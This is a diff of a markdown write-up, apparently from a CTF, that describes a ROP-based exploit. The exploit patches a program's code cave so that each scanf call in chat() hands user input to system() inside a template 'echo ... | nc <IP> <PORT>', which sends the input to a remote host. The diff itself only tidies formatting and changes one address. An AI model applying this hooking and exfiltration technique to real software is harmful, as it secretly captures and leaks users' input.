@@ -60,7 +60,7 @@ We're gonna do something interesting: by exploting the vulnerability using ROP t
 
 For some extra fun, we'll do the following:
 
-Find the bytes we need somewhere in memory.
+- Find the bytes we need somewhere in memory.
 
 ```
 (gdb) find/1b system, +999999999999, 0xe9, 0x9b, 0x02, 0x00, 0x00
@@ -68,7 +68,7 @@ Find the bytes we need somewhere in memory.
 1 pattern found.
 ```
 
-Then use a custom function, which can copy any number of bytes from one memory location to another:
+- Then use a custom function, which can copy any number of bytes from one memory location to another.
 
 ```
 def bncpy(dest, src, n):
@@ -142,7 +142,7 @@ To jump to our code cave, we turn the jump in `scanf@plt` to this:
 
 #### Put a template attack string in the code cave
 
-A template attack string is written to 0x401000. This will be used to generate a "fresh" attack string each time `scanf()` is called by `chat()`
+A template attack string is written to 0x401400. This will be used to generate a "fresh" attack string each time `scanf()` is called by `chat()`
 
 ```
 'echo                          | nc <IP> <PORT>'
@@ -198,7 +198,7 @@ It does the following:
 1. First, it takes a copy of the template string and puts it at 0x401380.
 2. Next, it calls `gets()` and stores the user input in 0x401500.
 3. The user input is copied to 0x401385 (right after "echo ").
-4. system() is called with the string in 0x401380 as its argument.
+4. `system()`is called with the string in 0x401380 as its argument.
 5. The first byte of user input is put in the `cl` register.
 6. The program continues execution at `chat+49`.
 
